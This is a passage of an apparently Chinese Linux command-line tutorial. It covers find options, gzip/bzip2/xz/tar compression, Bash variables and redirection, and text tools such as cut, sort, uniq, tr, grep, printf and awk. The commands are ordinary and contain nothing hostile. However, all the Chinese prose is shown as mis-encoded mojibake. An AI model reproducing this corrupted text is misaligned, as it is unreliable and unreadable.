</code></pre></div><p><strong>â‘  ä¸æ—¶é—´æœ‰å…³çš„é€‰é¡¹</strong></p>
<div><pre><code>-mtime  n ï¼šåˆ—å‡ºåœ¨ n å¤©å‰çš„é‚£ä¸€å¤©ä¿®æ”¹è¿‡å†…å®¹çš„æ–‡ä»¶
-mtime +n ï¼šåˆ—å‡ºåœ¨ n å¤©ä¹‹å‰ (ä¸å« n å¤©æœ¬èº«) ä¿®æ”¹è¿‡å†…å®¹çš„æ–‡ä»¶
-mtime -n ï¼šåˆ—å‡ºåœ¨ n å¤©ä¹‹å†… (å« n å¤©æœ¬èº«) ä¿®æ”¹è¿‡å†…å®¹çš„æ–‡ä»¶
-newer file ï¼š åˆ—å‡ºæ¯” file æ›´æ–°çš„æ–‡ä»¶
</code></pre></div><p>+4ã€4 å’Œ -4 çš„æŒ‡ç¤ºçš„æ—¶é—´èŒƒå›´å¦‚ä¸‹ï¼š</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/658fc5e7-79c0-4247-9445-d69bf194c539.png" width=""/> </div><br>
<p><strong>â‘¡ ä¸æ–‡ä»¶æ‹¥æœ‰è€…å’Œæ‰€å±ç¾¤ç»„æœ‰å…³çš„é€‰é¡¹</strong></p>
<div><pre><code>-uid n
-gid n
-user name
-group name
-nouser ï¼šæœç´¢æ‹¥æœ‰è€…ä¸å­˜åœ¨ /etc/passwd çš„æ–‡ä»¶
-nogroupï¼šæœç´¢æ‰€å±ç¾¤ç»„ä¸å­˜åœ¨äº /etc/group çš„æ–‡ä»¶
</code></pre></div><p><strong>â‘¢ ä¸æ–‡ä»¶æƒé™å’Œåç§°æœ‰å…³çš„é€‰é¡¹</strong></p>
<div><pre><code>-name filename
-size [+-]SIZEï¼šæœå¯»æ¯” SIZE è¿˜è¦å¤§ (+) æˆ–å° (-) çš„æ–‡ä»¶ã€‚è¿™ä¸ª SIZE çš„è§„æ ¼æœ‰ï¼šc: ä»£è¡¨ byteï¼Œk: ä»£è¡¨ 1024bytesã€‚æ‰€ä»¥ï¼Œè¦æ‰¾æ¯” 50KB è¿˜è¦å¤§çš„æ–‡ä»¶ï¼Œå°±æ˜¯ -size +50k
-type TYPE
-perm mode  ï¼šæœç´¢æƒé™ç­‰äº mode çš„æ–‡ä»¶
-perm -mode ï¼šæœç´¢æƒé™åŒ…å« mode çš„æ–‡ä»¶
-perm /mode ï¼šæœç´¢æƒé™åŒ…å«ä»»ä¸€ mode çš„æ–‡ä»¶
</code></pre></div><h1 id="å…­ã€å‹ç¼©ä¸æ‰“åŒ…" tabindex="-1"> å…­ã€å‹ç¼©ä¸æ‰“åŒ…</h1>
<h2 id="å‹ç¼©æ–‡ä»¶å" tabindex="-1"> å‹ç¼©æ–‡ä»¶å</h2>
<p>Linux åº•ä¸‹æœ‰å¾ˆå¤šå‹ç¼©æ–‡ä»¶åï¼Œå¸¸è§çš„å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th>æ‰©å±•å</th>
<th>å‹ç¼©ç¨‹åº</th>
</tr>
</thead>
<tbody>
<tr>
<td>*.Z</td>
<td>compress</td>
</tr>
<tr>
<td>*.zip</td>
<td>zip</td>
</tr>
<tr>
<td>*.gz</td>
<td>gzip</td>
</tr>
<tr>
<td>*.bz2</td>
<td>bzip2</td>
</tr>
<tr>
<td>*.xz</td>
<td>xz</td>
</tr>
<tr>
<td>*.tar</td>
<td>tar ç¨‹åºæ‰“åŒ…çš„æ•°æ®ï¼Œæ²¡æœ‰ç»è¿‡å‹ç¼©</td>
</tr>
<tr>
<td>*.tar.gz</td>
<td>tar ç¨‹åºæ‰“åŒ…çš„æ–‡ä»¶ï¼Œç»è¿‡ gzip çš„å‹ç¼©</td>
</tr>
<tr>
<td>*.tar.bz2</td>
<td>tar ç¨‹åºæ‰“åŒ…çš„æ–‡ä»¶ï¼Œç»è¿‡ bzip2 çš„å‹ç¼©</td>
</tr>
<tr>
<td>*.tar.xz</td>
<td>tar ç¨‹åºæ‰“åŒ…çš„æ–‡ä»¶ï¼Œç»è¿‡ xz çš„å‹ç¼©</td>
</tr>
</tbody>
</table>
<h2 id="å‹ç¼©æŒ‡ä»¤" tabindex="-1"> å‹ç¼©æŒ‡ä»¤</h2>
<h3 id="_1-gzip" tabindex="-1"> 1. gzip</h3>
<p>gzip æ˜¯ Linux ä½¿ç”¨æœ€å¹¿çš„å‹ç¼©æŒ‡ä»¤ï¼Œå¯ä»¥è§£å¼€ compressã€zip ä¸ gzip æ‰€å‹ç¼©çš„æ–‡ä»¶ã€‚</p>
<p>ç»è¿‡ gzip å‹ç¼©è¿‡ï¼Œæºæ–‡ä»¶å°±ä¸å­˜åœ¨äº†ã€‚</p>
<p>æœ‰ 9 ä¸ªä¸åŒçš„å‹ç¼©ç­‰çº§å¯ä»¥ä½¿ç”¨ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ zcatã€zmoreã€zless æ¥è¯»å–å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p>
<div><pre><code>$ gzip [-cdtv#] filename
-c ï¼šå°†å‹ç¼©çš„æ•°æ®è¾“å‡ºåˆ°å±å¹•ä¸Š
-d ï¼šè§£å‹ç¼©
-t ï¼šæ£€éªŒå‹ç¼©æ–‡ä»¶æ˜¯å¦å‡ºé”™
-v ï¼šæ˜¾ç¤ºå‹ç¼©æ¯”ç­‰ä¿¡æ¯
-# ï¼š # ä¸ºæ•°å­—çš„æ„æ€ï¼Œä»£è¡¨å‹ç¼©ç­‰çº§ï¼Œæ•°å­—è¶Šå¤§å‹ç¼©æ¯”è¶Šé«˜ï¼Œé»˜è®¤ä¸º 6
</code></pre></div><h3 id="_2-bzip2" tabindex="-1"> 2. bzip2</h3>
<p>æä¾›æ¯” gzip æ›´é«˜çš„å‹ç¼©æ¯”ã€‚</p>
<p>æŸ¥çœ‹å‘½ä»¤ï¼šbzcatã€bzmoreã€bzlessã€bzgrepã€‚</p>
<div><pre><code>$ bzip2 [-cdkzv#] filename
-k ï¼šä¿ç•™æºæ–‡ä»¶
</code></pre></div><h3 id="_3-xz" tabindex="-1"> 3. xz</h3>
<p>æä¾›æ¯” bzip2 æ›´ä½³çš„å‹ç¼©æ¯”ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œgzipã€bzip2ã€xz çš„å‹ç¼©æ¯”ä¸æ–­ä¼˜åŒ–ã€‚ä¸è¿‡è¦æ³¨æ„çš„æ˜¯ï¼Œå‹ç¼©æ¯”è¶Šé«˜ï¼Œå‹ç¼©çš„æ—¶é—´ä¹Ÿè¶Šé•¿ã€‚</p>
<p>æŸ¥çœ‹å‘½ä»¤ï¼šxzcatã€xzmoreã€xzlessã€xzgrepã€‚</p>
<div><pre><code>$ xz [-dtlkc#] filename
</code></pre></div><h2 id="æ‰“åŒ…" tabindex="-1"> æ‰“åŒ…</h2>
<p>å‹ç¼©æŒ‡ä»¤åªèƒ½å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè€Œæ‰“åŒ…èƒ½å¤Ÿå°†å¤šä¸ªæ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªå¤§æ–‡ä»¶ã€‚tar ä¸ä»…å¯ä»¥ç”¨äºæ‰“åŒ…ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ gzipã€bzip2ã€xz å°†æ‰“åŒ…æ–‡ä»¶è¿›è¡Œå‹ç¼©ã€‚</p>
<div><pre><code>$ tar [-z|-j|-J] [cv] [-f æ–°å»ºçš„ tar æ–‡ä»¶] filename...  ==æ‰“åŒ…å‹ç¼©
$ tar [-z|-j|-J] [tv] [-f å·²æœ‰çš„ tar æ–‡ä»¶]              ==æŸ¥çœ‹
$ tar [-z|-j|-J] [xv] [-f å·²æœ‰çš„ tar æ–‡ä»¶] [-C ç›®å½•]    ==è§£å‹ç¼©
-z ï¼šä½¿ç”¨ zipï¼›
-j ï¼šä½¿ç”¨ bzip2ï¼›
-J ï¼šä½¿ç”¨ xzï¼›
-c ï¼šæ–°å»ºæ‰“åŒ…æ–‡ä»¶ï¼›
-t ï¼šæŸ¥çœ‹æ‰“åŒ…æ–‡ä»¶é‡Œé¢æœ‰å“ªäº›æ–‡ä»¶ï¼›
-x ï¼šè§£æ‰“åŒ…æˆ–è§£å‹ç¼©çš„åŠŸèƒ½ï¼›
-v ï¼šåœ¨å‹ç¼©/è§£å‹ç¼©çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¾ç¤ºæ­£åœ¨å¤„ç†çš„æ–‡ä»¶åï¼›
-f : filenameï¼šè¦å¤„ç†çš„æ–‡ä»¶ï¼›
-C ç›®å½• ï¼š åœ¨ç‰¹å®šç›®å½•è§£å‹ç¼©ã€‚
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><table>
<thead>
<tr>
<th style="text-align:center">ä½¿ç”¨æ–¹å¼</th>
<th>å‘½ä»¤</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">æ‰“åŒ…å‹ç¼©</td>
<td>tar -jcv -f filename.tar.bz2 è¦è¢«å‹ç¼©çš„æ–‡ä»¶æˆ–ç›®å½•åç§°</td>
</tr>
<tr>
<td style="text-align:center">æŸ¥ çœ‹</td>
<td>tar -jtv -f filename.tar.bz2</td>
</tr>
<tr>
<td style="text-align:center">è§£å‹ç¼©</td>
<td>tar -jxv -f filename.tar.bz2 -C è¦è§£å‹ç¼©çš„ç›®å½•</td>
</tr>
</tbody>
</table>
<h1 id="ä¸ƒã€bash" tabindex="-1"> ä¸ƒã€Bash</h1>
<p>å¯ä»¥é€šè¿‡ Shell è¯·æ±‚å†…æ ¸æä¾›æœåŠ¡ï¼ŒBash æ­£æ˜¯ Shell çš„ä¸€ç§ã€‚</p>
<h2 id="ç‰¹æ€§" tabindex="-1"> ç‰¹æ€§</h2>
<ul>
<li>å‘½ä»¤å†å²ï¼šè®°å½•ä½¿ç”¨è¿‡çš„å‘½ä»¤</li>
<li>å‘½ä»¤ä¸æ–‡ä»¶è¡¥å…¨ï¼šå¿«æ·é”®ï¼štab</li>
<li>å‘½ååˆ«åï¼šä¾‹å¦‚ ll æ˜¯ ls -al çš„åˆ«å</li>
<li>shell scripts</li>
<li>é€šé…ç¬¦ï¼šä¾‹å¦‚ ls -l /usr/bin/X* åˆ—å‡º /usr/bin ä¸‹é¢æ‰€æœ‰ä»¥ X å¼€å¤´çš„æ–‡ä»¶</li>
</ul>
<h2 id="å˜é‡æ“ä½œ" tabindex="-1"> å˜é‡æ“ä½œ</h2>
<p>å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ç›´æ¥ä½¿ç”¨ =ã€‚</p>
<p>å¯¹å˜é‡å–ç”¨éœ€è¦åœ¨å˜é‡å‰åŠ ä¸Š $ ï¼Œä¹Ÿå¯ä»¥ç”¨ ${} çš„å½¢å¼ï¼›</p>
<p>è¾“å‡ºå˜é‡ä½¿ç”¨ echo å‘½ä»¤ã€‚</p>
<div><pre><code>$ <span>x</span><span>=</span>abc
$ <span>echo</span> <span>$x</span>
$ <span>echo</span> <span>${x}</span>
</code></pre></div><p>å˜é‡å†…å®¹å¦‚æœæœ‰ç©ºæ ¼ï¼Œå¿…é¡»ä½¿ç”¨åŒå¼•å·æˆ–è€…å•å¼•å·ã€‚</p>
<ul>
<li>åŒå¼•å·å†…çš„ç‰¹æ®Šå­—ç¬¦å¯ä»¥ä¿ç•™åŸæœ¬ç‰¹æ€§ï¼Œä¾‹å¦‚ x=&quot;lang is $LANG&quot;ï¼Œåˆ™ x çš„å€¼ä¸º lang is zh_TW.UTF-8ï¼›</li>
<li>å•å¼•å·å†…çš„ç‰¹æ®Šå­—ç¬¦å°±æ˜¯ç‰¹æ®Šå­—ç¬¦æœ¬èº«ï¼Œä¾‹å¦‚ x='lang is $LANG'ï¼Œåˆ™ x çš„å€¼ä¸º lang is $LANGã€‚</li>
</ul>
<p>å¯ä»¥ä½¿ç”¨ `æŒ‡ä»¤` æˆ–è€… $(æŒ‡ä»¤) çš„æ–¹å¼å°†æŒ‡ä»¤çš„æ‰§è¡Œç»“æœèµ‹å€¼ç»™å˜é‡ã€‚ä¾‹å¦‚ version=$(uname -r)ï¼Œåˆ™ version çš„å€¼ä¸º 4.15.0-22-genericã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ export å‘½ä»¤å°†è‡ªå®šä¹‰å˜é‡è½¬æˆç¯å¢ƒå˜é‡ï¼Œç¯å¢ƒå˜é‡å¯ä»¥åœ¨å­ç¨‹åºä¸­ä½¿ç”¨ï¼Œæ‰€è°“å­ç¨‹åºå°±æ˜¯ç”±å½“å‰ Bash è€Œäº§ç”Ÿçš„å­ Bashã€‚</p>
<p>Bash çš„å˜é‡å¯ä»¥å£°æ˜ä¸ºæ•°ç»„å’Œæ•´æ•°æ•°å­—ã€‚æ³¨æ„æ•°å­—ç±»å‹æ²¡æœ‰æµ®ç‚¹æ•°ã€‚å¦‚æœä¸è¿›è¡Œå£°æ˜ï¼Œé»˜è®¤æ˜¯å­—ç¬¦ä¸²ç±»å‹ã€‚å˜é‡çš„å£°æ˜ä½¿ç”¨ declare å‘½ä»¤ï¼š</p>
<div><pre><code>$ declare [-aixr] variable
-a ï¼š å®šä¹‰ä¸ºæ•°ç»„ç±»å‹
-i ï¼š å®šä¹‰ä¸ºæ•´æ•°ç±»å‹
-x ï¼š å®šä¹‰ä¸ºç¯å¢ƒå˜é‡
-r ï¼š å®šä¹‰ä¸º readonly ç±»å‹
</code></pre></div><p>ä½¿ç”¨ [ ] æ¥å¯¹æ•°ç»„è¿›è¡Œç´¢å¼•æ“ä½œï¼š</p>
<div><pre><code>$ array<span>[</span><span>1</span><span>]</span><span>=</span>a
$ array<span>[</span><span>2</span><span>]</span><span>=</span>b
$ <span>echo</span> <span>${array<span>[</span>1<span>]</span>}</span>
</code></pre></div><h2 id="æŒ‡ä»¤æœç´¢é¡ºåº" tabindex="-1"> æŒ‡ä»¤æœç´¢é¡ºåº</h2>
<ul>
<li>ä»¥ç»å¯¹æˆ–ç›¸å¯¹è·¯å¾„æ¥æ‰§è¡ŒæŒ‡ä»¤ï¼Œä¾‹å¦‚ /bin/ls æˆ–è€… ./ls ï¼›</li>
<li>ç”±åˆ«åæ‰¾åˆ°è¯¥æŒ‡ä»¤æ¥æ‰§è¡Œï¼›</li>
<li>ç”± Bash å†…ç½®çš„æŒ‡ä»¤æ¥æ‰§è¡Œï¼›</li>
<li>æŒ‰ $PATH å˜é‡æŒ‡å®šçš„æœç´¢è·¯å¾„çš„é¡ºåºæ‰¾åˆ°ç¬¬ä¸€ä¸ªæŒ‡ä»¤æ¥æ‰§è¡Œã€‚</li>
</ul>
<h2 id="æ•°æ®æµé‡å®šå‘" tabindex="-1"> æ•°æ®æµé‡å®šå‘</h2>
<p>é‡å®šå‘æŒ‡çš„æ˜¯ä½¿ç”¨æ–‡ä»¶ä»£æ›¿æ ‡å‡†è¾“å…¥ã€æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚</p>
<table>
<thead>
<tr>
<th style="text-align:center">1</th>
<th style="text-align:center">ä»£ç </th>
<th style="text-align:center">è¿ç®—ç¬¦</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">æ ‡å‡†è¾“å…¥ (stdin)</td>
<td style="text-align:center">0</td>
<td style="text-align:center">&lt; æˆ– &lt;&lt;</td>
</tr>
<tr>
<td style="text-align:center">æ ‡å‡†è¾“å‡º (stdout)</td>
<td style="text-align:center">1</td>
<td style="text-align:center">&gt; æˆ– &gt;&gt;</td>
</tr>
<tr>
<td style="text-align:center">æ ‡å‡†é”™è¯¯è¾“å‡º (stderr)</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2&gt; æˆ– 2&gt;&gt;</td>
</tr>
</tbody>
</table>
<p>å…¶ä¸­ï¼Œæœ‰ä¸€ä¸ªç®­å¤´çš„è¡¨ç¤ºä»¥è¦†ç›–çš„æ–¹å¼é‡å®šå‘ï¼Œè€Œæœ‰ä¸¤ä¸ªç®­å¤´çš„è¡¨ç¤ºä»¥è¿½åŠ çš„æ–¹å¼é‡å®šå‘ã€‚</p>
<p>å¯ä»¥å°†ä¸éœ€è¦çš„æ ‡å‡†è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ° /dev/nullï¼Œç›¸å½“äºæ‰”è¿›åƒåœ¾ç®±ã€‚</p>
<p>å¦‚æœéœ€è¦å°†æ ‡å‡†è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºåŒæ—¶é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œéœ€è¦å°†æŸä¸ªè¾“å‡ºè½¬æ¢ä¸ºå¦ä¸€ä¸ªè¾“å‡ºï¼Œä¾‹å¦‚ 2&gt;&amp;1 è¡¨ç¤ºå°†æ ‡å‡†é”™è¯¯è¾“å‡ºè½¬æ¢ä¸ºæ ‡å‡†è¾“å‡ºã€‚</p>
<div><pre><code>$ <span>find</span> /home -name .bashrc <span>></span> list <span><span>2</span>></span><span>&amp;1</span>
</code></pre></div><h1 id="å…«ã€ç®¡é“æŒ‡ä»¤" tabindex="-1"> å…«ã€ç®¡é“æŒ‡ä»¤</h1>
<p>ç®¡é“æ˜¯å°†ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å‡ºä½œä¸ºå¦ä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å…¥ï¼Œåœ¨æ•°æ®éœ€è¦ç»è¿‡å¤šä¸ªæ­¥éª¤çš„å¤„ç†ä¹‹åæ‰èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹æ—¶å°±å¯ä»¥ä½¿ç”¨ç®¡é“ã€‚</p>
<p>åœ¨å‘½ä»¤ä¹‹é—´ä½¿ç”¨ | åˆ†éš”å„ä¸ªç®¡é“å‘½ä»¤ã€‚</p>
<div><pre><code>$ <span>ls</span> -al /etc <span>|</span> <span>less</span>
</code></pre></div><h2 id="æå–æŒ‡ä»¤" tabindex="-1"> æå–æŒ‡ä»¤</h2>
<p>cut å¯¹æ•°æ®è¿›è¡Œåˆ‡åˆ†ï¼Œå–å‡ºæƒ³è¦çš„éƒ¨åˆ†ã€‚</p>
<p>åˆ‡åˆ†è¿‡ç¨‹ä¸€è¡Œä¸€è¡Œåœ°è¿›è¡Œã€‚</p>
<div><pre><code>$ cut
-d ï¼šåˆ†éš”ç¬¦
-f ï¼šç»è¿‡ -d åˆ†éš”åï¼Œä½¿ç”¨ -f n å–å‡ºç¬¬ n ä¸ªåŒºé—´
-c ï¼šä»¥å­—ç¬¦ä¸ºå•ä½å–å‡ºåŒºé—´
</code></pre></div><p>ç¤ºä¾‹ 1ï¼šlast æ˜¾ç¤ºç™»å…¥è€…çš„ä¿¡æ¯ï¼Œå–å‡ºç”¨æˆ·åã€‚</p>
<div><pre><code>$ last
root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in
root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)
root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)

$ last | cut -d ' ' -f 1
</code></pre></div><p>ç¤ºä¾‹ 2ï¼šå°† export è¾“å‡ºçš„ä¿¡æ¯ï¼Œå–å‡ºç¬¬ 12 å­—ç¬¦ä»¥åçš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚</p>
<div><pre><code>$ export
declare -x HISTCONTROL="ignoredups"
declare -x HISTSIZE="1000"
declare -x HOME="/home/dmtsai"
declare -x HOSTNAME="study.centos.vbird"
.....(å…¶ä»–çœç•¥).....

$ export | cut -c 12-
</code></pre></div><h2 id="æ’åºæŒ‡ä»¤" tabindex="-1"> æ’åºæŒ‡ä»¤</h2>
<p><strong>sort</strong>  ç”¨äºæ’åºã€‚</p>
<div><pre><code>$ sort [-fbMnrtuk] [file or stdin]
-f ï¼šå¿½ç•¥å¤§å°å†™
-b ï¼šå¿½ç•¥æœ€å‰é¢çš„ç©ºæ ¼
-M ï¼šä»¥æœˆä»½çš„åå­—æ¥æ’åºï¼Œä¾‹å¦‚ JANï¼ŒDEC
-n ï¼šä½¿ç”¨æ•°å­—
-r ï¼šåå‘æ’åº
-u ï¼šç›¸å½“äº uniqueï¼Œé‡å¤çš„å†…å®¹åªå‡ºç°ä¸€æ¬¡
-t ï¼šåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸º tab
-k ï¼šæŒ‡å®šæ’åºçš„åŒºé—´
</code></pre></div><p>ç¤ºä¾‹ï¼š/etc/passwd æ–‡ä»¶å†…å®¹ä»¥ : æ¥åˆ†éš”ï¼Œè¦æ±‚ä»¥ç¬¬ä¸‰åˆ—è¿›è¡Œæ’åºã€‚</p>
<div><pre><code>$ cat /etc/passwd | sort -t ':' -k 3
root:x:0:0:root:/root:/bin/bash
dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash
alex:x:1001:1002::/home/alex:/bin/bash
arod:x:1002:1003::/home/arod:/bin/bash
</code></pre></div><p><strong>uniq</strong>  å¯ä»¥å°†é‡å¤çš„æ•°æ®åªå–ä¸€ä¸ªã€‚</p>
<div><pre><code>$ uniq [-ic]
-i ï¼šå¿½ç•¥å¤§å°å†™
-c ï¼šè¿›è¡Œè®¡æ•°
</code></pre></div><p>ç¤ºä¾‹ï¼šå–å¾—æ¯ä¸ªäººçš„ç™»å½•æ€»æ¬¡æ•°</p>
<div><pre><code>$ last | cut -d ' ' -f 1 | sort | uniq -c
1
6 (unknown
47 dmtsai
4 reboot
7 root
1 wtmp
</code></pre></div><h2 id="åŒå‘è¾“å‡ºé‡å®šå‘" tabindex="-1"> åŒå‘è¾“å‡ºé‡å®šå‘</h2>
<p>è¾“å‡ºé‡å®šå‘ä¼šå°†è¾“å‡ºå†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶ä¸­ï¼Œè€Œ  <strong>tee</strong>  ä¸ä»…èƒ½å¤Ÿå®Œæˆè¿™ä¸ªåŠŸèƒ½ï¼Œè¿˜èƒ½ä¿ç•™å±å¹•ä¸Šçš„è¾“å‡ºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨ tee æŒ‡ä»¤ï¼Œä¸€ä¸ªè¾“å‡ºä¼šåŒæ—¶ä¼ é€åˆ°æ–‡ä»¶å’Œå±å¹•ä¸Šã€‚</p>
<div><pre><code>$ tee [-a] file
</code></pre></div><h2 id="å­—ç¬¦è½¬æ¢æŒ‡ä»¤" tabindex="-1"> å­—ç¬¦è½¬æ¢æŒ‡ä»¤</h2>
<p><strong>tr</strong>  ç”¨æ¥åˆ é™¤ä¸€è¡Œä¸­çš„å­—ç¬¦ï¼Œæˆ–è€…å¯¹å­—ç¬¦è¿›è¡Œæ›¿æ¢ã€‚</p>
<div><pre><code>$ tr [-ds] SET1 ...
-d ï¼š åˆ é™¤è¡Œä¸­ SET1 è¿™ä¸ªå­—ç¬¦ä¸²
</code></pre></div><p>ç¤ºä¾‹ï¼Œå°† last è¾“å‡ºçš„ä¿¡æ¯æ‰€æœ‰å°å†™è½¬æ¢ä¸ºå¤§å†™ã€‚</p>
<div><pre><code>$ last | tr '[a-z]' '[A-Z]'
</code></pre></div><p><strong>col</strong>  å°† tab å­—ç¬¦è½¬ä¸ºç©ºæ ¼å­—ç¬¦ã€‚</p>
<div><pre><code>$ col [-xb]
-x ï¼š å°† tab é”®è½¬æ¢æˆå¯¹ç­‰çš„ç©ºæ ¼é”®
</code></pre></div><p><strong>expand</strong>  å°† tab è½¬æ¢ä¸€å®šæ•°é‡çš„ç©ºæ ¼ï¼Œé»˜è®¤æ˜¯ 8 ä¸ªã€‚</p>
<div><pre><code>$ expand [-t] file
-t ï¼štab è½¬ä¸ºç©ºæ ¼çš„æ•°é‡
</code></pre></div><p><strong>join</strong>  å°†æœ‰ç›¸åŒæ•°æ®çš„é‚£ä¸€è¡Œåˆå¹¶åœ¨ä¸€èµ·ã€‚</p>
<div><pre><code>$ join [-ti12] file1 file2
-t ï¼šåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºç©ºæ ¼
-i ï¼šå¿½ç•¥å¤§å°å†™çš„å·®å¼‚
-1 ï¼šç¬¬ä¸€ä¸ªæ–‡ä»¶æ‰€ç”¨çš„æ¯”è¾ƒå­—æ®µ
-2 ï¼šç¬¬äºŒä¸ªæ–‡ä»¶æ‰€ç”¨çš„æ¯”è¾ƒå­—æ®µ
</code></pre></div><p><strong>paste</strong>  ç›´æ¥å°†ä¸¤è¡Œç²˜è´´åœ¨ä¸€èµ·ã€‚</p>
<div><pre><code>$ paste [-d] file1 file2
-d ï¼šåˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸º tab
</code></pre></div><h2 id="åˆ†åŒºæŒ‡ä»¤" tabindex="-1"> åˆ†åŒºæŒ‡ä»¤</h2>
<p><strong>split</strong>  å°†ä¸€ä¸ªæ–‡ä»¶åˆ’åˆ†æˆå¤šä¸ªæ–‡ä»¶ã€‚</p>
<div><pre><code>$ split [-bl] file PREFIX
-b ï¼šä»¥å¤§å°æ¥è¿›è¡Œåˆ†åŒºï¼Œå¯åŠ å•ä½ï¼Œä¾‹å¦‚ b, k, m ç­‰
-l ï¼šä»¥è¡Œæ•°æ¥è¿›è¡Œåˆ†åŒºã€‚
- PREFIX ï¼šåˆ†åŒºæ–‡ä»¶çš„å‰å¯¼åç§°
</code></pre></div><h1 id="ä¹ã€æ­£åˆ™è¡¨è¾¾å¼" tabindex="-1"> ä¹ã€æ­£åˆ™è¡¨è¾¾å¼</h1>
<h2 id="grep" tabindex="-1"> grep</h2>
<p>g/re/pï¼ˆglobally search a regular expression and print)ï¼Œä½¿ç”¨æ­£åˆ™è¡¨ç¤ºå¼è¿›è¡Œå…¨å±€æŸ¥æ‰¾å¹¶æ‰“å°ã€‚</p>
<div><pre><code>$ grep [-acinv] [--color=auto] æœå¯»å­—ç¬¦ä¸² filename
-c ï¼š ç»Ÿè®¡ä¸ªæ•°
-i ï¼š å¿½ç•¥å¤§å°å†™
-n ï¼š è¾“å‡ºè¡Œå·
-v ï¼š åå‘é€‰æ‹©ï¼Œä¹Ÿå°±æ˜¯æ˜¾ç¤ºå‡ºæ²¡æœ‰ æœå¯»å­—ç¬¦ä¸² å†…å®¹çš„é‚£ä¸€è¡Œ
--color=auto ï¼šæ‰¾åˆ°çš„å…³é”®å­—åŠ é¢œè‰²æ˜¾ç¤º
</code></pre></div><p>ç¤ºä¾‹ï¼šæŠŠå«æœ‰ the å­—ç¬¦ä¸²çš„è¡Œæå–å‡ºæ¥ï¼ˆæ³¨æ„é»˜è®¤ä¼šæœ‰ --color=auto é€‰é¡¹ï¼Œå› æ­¤ä»¥ä¸‹å†…å®¹åœ¨ Linux ä¸­æœ‰é¢œè‰²æ˜¾ç¤º the å­—ç¬¦ä¸²ï¼‰</p>
<div><pre><code>$ grep -n 'the' regular_express.txt
8:I can't finish the test.
12:the symbol '*' is represented as start.
15:You are the best is mean you are the no. 1.
16:The world Happy is the same with "glad".
18:google is the best tools for search keyword
</code></pre></div><p>å› ä¸º { å’Œ } åœ¨ shell æ˜¯æœ‰ç‰¹æ®Šæ„ä¹‰çš„ï¼Œå› æ­¤å¿…é¡»è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚</p>
<div><pre><code>$ grep -n 'go\{2,5\}g' regular_express.txt
</code></pre></div><h2 id="printf" tabindex="-1"> printf</h2>
<p>ç”¨äºæ ¼å¼åŒ–è¾“å‡ºã€‚å®ƒä¸å±äºç®¡é“å‘½ä»¤ï¼Œåœ¨ç»™ printf ä¼ æ•°æ®æ—¶éœ€è¦ä½¿ç”¨ $( ) å½¢å¼ã€‚</p>
<div><pre><code>$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt)
    DmTsai    80    60    92    77.33
     VBird    75    55    80    70.00
       Ken    60    90    70    73.33
</code></pre></div><h2 id="awk" tabindex="-1"> awk</h2>
<p>æ˜¯ç”± Alfred Ahoï¼ŒPeter Weinberger, å’Œ Brian Kernighan åˆ›é€ ï¼Œawk è¿™ä¸ªåå­—å°±æ˜¯è¿™ä¸‰ä¸ªåˆ›å§‹äººåå­—çš„é¦–å­—æ¯ã€‚</p>
<p>awk æ¯æ¬¡å¤„ç†ä¸€è¡Œï¼Œå¤„ç†çš„æœ€å°å•ä½æ˜¯å­—æ®µï¼Œæ¯ä¸ªå­—æ®µçš„å‘½åæ–¹å¼ä¸ºï¼š$nï¼Œn ä¸ºå­—æ®µå·ï¼Œä» 1 å¼€å§‹ï¼Œ$0 è¡¨ç¤ºä¸€æ•´è¡Œã€‚</p>
<p>ç¤ºä¾‹ï¼šå–å‡ºæœ€è¿‘äº”ä¸ªç™»å½•ç”¨æˆ·çš„ç”¨æˆ·åå’Œ IP</p>
<div><pre><code>$ last -n 5
dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in
dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)
dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)
dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)
dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)
</code></pre></div><div><pre><code>$ last -n 5 | awk '{print $1 "\t" $3}'
